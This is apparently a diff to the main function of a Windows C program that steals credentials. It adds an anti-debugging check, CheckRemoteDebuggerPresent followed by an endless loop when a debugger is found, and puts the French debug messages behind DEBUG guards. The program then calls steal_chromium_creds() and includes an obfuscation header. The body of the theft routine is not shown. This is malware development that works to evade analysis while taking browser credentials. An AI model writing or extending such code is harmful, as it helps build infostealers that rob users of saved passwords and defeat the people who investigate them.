@@ -2,7 +2,6 @@
 
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <wchar.h>
 #include <windows.h>
 
@@ -11,9 +10,34 @@
 #include "obfuscation.h"
 
 int main(void) {
+#ifdef DEBUG
   // Puts the console in UTF-8
   // Allows us to print non-ASCII characters for debug
   SetConsoleOutputCP(CP_UTF8);
+#endif
+  // Check if a debugger is attached to the process
+  BOOL isDebuggerPresent = FALSE;
+  HANDLE hProcess = GetCurrentProcess();
+
+  if (CheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
+    if (isDebuggerPresent) {
+#ifdef DEBUG
+      printf("Un débogueur est détecté sur ce processus.\n");
+#endif
+      while (1);
+    } else {
+#ifdef DEBUG
+      printf("Aucun débogueur n'est détecté sur ce processus.\n");
+#endif
+    }
+  } else {
+#ifdef DEBUG
+    printf(
+        "Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur : "
+        "%lu\n",
+        GetLastError());
+#endif
+  }
 
   steal_chromium_creds();
 
